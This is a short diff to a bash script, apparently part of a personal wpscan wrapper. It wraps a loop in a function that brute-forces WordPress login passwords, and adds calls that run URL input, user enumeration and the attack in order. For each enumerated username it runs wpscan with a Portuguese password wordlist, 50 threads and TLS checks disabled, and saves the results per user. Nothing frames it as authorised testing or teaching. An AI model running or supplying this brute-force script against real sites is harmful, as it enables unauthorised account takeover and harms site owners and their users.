@@ -22,7 +22,17 @@ function user_enumeration () {
 
 # Perform brute force attack for each username
 
-    for USERNAME in $USERLIST; do
+function force_brute () {
+        for USERNAME in $USERLIST; do
         echo "Performing brute force attack for user: $USERNAME..."
         wpscan --url "$website_url" --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
     done
+}
+
+# Call Functions
+
+imput_url
+user_enumeration
+force_brute
+
+# End of Script
